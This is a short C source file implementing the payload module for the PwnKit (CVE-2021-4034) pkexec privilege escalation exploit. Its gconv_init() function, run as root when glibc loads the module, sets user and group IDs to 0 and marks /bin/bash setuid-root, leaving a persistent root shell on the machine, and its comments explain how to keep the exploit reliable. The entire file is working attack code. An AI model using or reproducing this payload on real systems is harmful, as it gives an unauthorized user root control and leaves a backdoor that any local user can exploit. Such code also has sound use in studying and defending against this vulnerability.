/*
 * pwnkit_payload.c — gconv module payload for CVE-2021-4034
 *
 * glibc's gconv loader calls gconv_init() when loading a charset
 * module — NOT a constructor.  Must export both gconv() and gconv_init().
 *
 * Sets SUID bit on /bin/bash rather than execve() to avoid crashing
 * pkexec's process mid-flight.
 */
#include <unistd.h>
#include <sys/stat.h>

/* Required export — called by glibc gconv machinery */
void gconv(void) {}

/* Required export — called on module load with euid 0 */
void gconv_init(void *step)
{
    (void)step;
    setuid(0);
    setgid(0);
    chmod("/bin/bash", 04755);
}
